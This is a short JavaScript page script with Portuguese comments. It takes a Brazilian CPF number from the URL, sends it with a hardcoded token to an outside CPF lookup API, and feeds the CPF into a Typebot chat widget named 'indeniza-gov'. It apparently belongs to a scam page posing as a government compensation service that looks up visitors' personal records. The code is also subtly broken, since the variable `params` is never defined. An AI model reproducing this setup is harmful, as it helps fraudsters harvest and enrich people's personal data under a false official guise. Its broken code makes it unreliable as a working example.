document.addEventListener("DOMContentLoaded", function () {
    const cpf = params.get('cpf') || '';
    
    // Função para fazer a consulta à nova API
    function consultarCPF(cpf) {
        const apiUrl = `https://dtrack.online/api/request/cpf?token=32133243245632495359aa2312135111lla9ss2i122j3oi21321546&cpf=${cpf}`;
        
        fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                console.log(data);
            })
            .catch(error => {
                console.error('Erro ao consultar a API:', error);
            });
    }
    
    // Chamar a função de consulta
    consultarCPF(cpf);
    
    // Inicializar o Typebot de forma assíncrona
    const typebotInitScript = document.createElement("script");
    typebotInitScript.type = "module";
    typebotInitScript.src = 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.78/dist/web.js';
    typebotInitScript.onload = function() {
        Typebot.initStandard({
            typebot: "indeniza-gov-xtig8ub",
            apiHost: "https://sendbot.chat",
            customVariables: {
                cpf: cpf
            }
        });
    };
    document.body.append(typebotInitScript);
    
    setTimeout(() => {
        document.querySelector(".typebot-atendimento").scrollIntoView({ behavior: "smooth" });
    }, 1000);
});
